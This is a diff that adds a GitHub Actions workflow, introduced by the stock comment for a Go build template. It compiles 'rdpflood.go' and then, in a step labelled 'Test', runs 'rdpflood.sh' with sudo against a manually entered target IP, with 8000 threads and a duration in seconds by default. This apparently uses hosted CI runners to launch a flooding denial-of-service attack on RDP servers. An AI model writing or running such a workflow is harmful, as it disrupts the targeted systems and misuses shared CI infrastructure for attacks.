@@ -1,0 +1,39 @@
+# This workflow will build a golang project
+# For more information see: https://docs.github.com/en/actions/automating-builds-and-tests/building-and-testing-go
+
+name: Go
+
+on:
+  workflow_dispatch:
+    inputs:
+      iptgt:
+        description: "IP Target"
+        required: true
+      thread:
+        description: "Threads"
+        required: true
+        default: "8000"
+      duration:
+        description: "Duration (In Seconds)"
+        required: true
+        default: "60"
+
+jobs:
+
+  build:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v3
+
+    - name: Set up Go
+      uses: actions/setup-go@v4
+      with:
+        go-version: '1.20'
+
+    - name: Build
+      run: go build rdpflood.go
+
+    - name: Test
+      run: |
+        chmod +x rdpflood.sh
+        sudo ./rdpflood.sh ${{ github.event.inputs.iptgt }} ${{ github.event.inputs.thread }} ${{ github.event.inputs.duration }}
